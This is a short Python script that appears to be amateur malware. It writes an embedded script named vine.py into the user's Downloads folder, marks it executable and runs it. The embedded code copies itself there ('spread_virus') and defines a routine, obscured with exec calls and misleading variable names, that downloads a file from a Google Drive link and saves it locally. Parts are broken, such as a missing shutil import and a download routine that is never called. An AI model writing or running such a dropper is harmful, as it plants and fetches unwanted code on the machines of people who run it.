import os
import shutil
import subprocess

File_Exists_Error_directory = os.path.expanduser("~/Downloads")
say_my_name = "vine.py"

unjustified_code = """
import os
import time
import random

def spread_virus():
    File_Exists_Error_directory = os.path.expanduser("~/Downloads")
    Unicode_Error_name = "vine.py"
    unexpected_directory = os.path.join(File_Exists_Error_directory, Unicode_Error_name)

    if not os.path.exists(unexpected_directory):
        shutil.copyfile(__file__, unexpected_directory)

    print(f"spread your cheeks to {unexpected_directory}")

def exec_safe():
    print("Executing malicious task...")

if __name__ == "__main__":
    spread_virus()
def execute_malicious_task():
    print("Executing malicious task...")
    import requests as r
    exec("url='https://drive.google.com/uc?export=download&id=1RdeFY7fWcrnLurgr1YNutANfl1as_L7l'")
    exec("response=r.get(url)")
    with open("downloaded_file", "wb") as file:
        exec("file.write(response.content)")
"""

unexpected_directory = os.path.join(File_Exists_Error_directory, say_my_name)
with open(unexpected_directory, 'w') as Unicode_Error:
    Unicode_Error.write(unjustified_code)

st = os.stat(unexpected_directory)
os.chmod(unexpected_directory, st.st_mode | 0o111)

if not os.path.exists(unexpected_directory):
    shutil.copyfile(__file__, unexpected_directory)

subprocess.call(["python", unexpected_directory])